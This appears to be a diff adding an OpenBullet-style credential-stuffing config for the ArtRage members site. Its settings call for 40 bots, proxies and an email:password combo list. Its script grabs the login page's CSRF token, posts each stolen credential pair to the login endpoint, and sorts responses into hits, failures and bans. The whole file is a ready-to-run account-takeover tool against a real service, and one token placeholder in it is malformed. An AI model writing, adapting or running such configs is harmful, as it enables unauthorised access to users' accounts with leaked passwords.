@@ -1,0 +1,72 @@
+[SETTINGS]
+{
+  "Name": "ArtRage",
+  "SuggestedBots": 40,
+  "LastModified": "2018-08-10T17:02:09.0061226+00:00",
+  "AdditionalInfo": "",
+  "Author": "PepeLeSpooder",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "4",
+      "Id": 1472513126
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "4",
+      "Id": 405987575
+    },
+    {
+      "SliceName": "USER",
+      "RuleType": 3,
+      "RuleString": "34",
+      "Id": 472237618
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 3,
+      "RuleString": "36",
+      "Id": 719324897
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://members.artrage.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "name=\"csrf-token\" content=\"" "\"/>" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST POST "https://members.artrage.com/session" AutoRedirect=TRUE 
+  CONTENT "authenticity_token=<TOKEN&email=<USER>&password=<PASS>&submitbtn=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://members.artrage.com/session" 
+  HEADER "origin: https://members.artrage.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, could not find a user with that email and password" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "Sorry, could not find a user with that email and password" 
+  KEYCHAIN Ban OR 
+    KEY "Sorry! There was an error loading this page" 
